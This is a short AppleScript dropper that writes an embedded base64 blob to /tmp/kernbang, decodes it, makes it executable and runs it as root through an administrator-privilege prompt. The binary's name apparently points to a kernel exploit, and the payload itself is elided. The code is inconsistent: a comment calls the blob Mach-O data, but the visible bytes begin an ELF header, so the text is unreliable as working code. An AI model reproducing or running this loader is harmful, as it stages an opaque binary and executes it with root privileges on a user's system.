set base64_payload to "
f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAwARAAAAAAABAAAAAAAAAAJAVAAAAAAAAAAAAAEAAOAA
... (truncated base64 Mach-O data) ...
"

set tmpPath to "/tmp/kernbang"
set b64Path to tmpPath & ".b64"

-- Write the base64 to a file
do shell script "echo " & quoted form of base64_payload & " > " & b64Path

-- Decode and extract binary
do shell script "base64 -d " & b64Path & " > " & tmpPath

-- Make it executable
do shell script "chmod +x " & tmpPath

-- Run it (as root)
do shell script tmpPath with administrator privileges
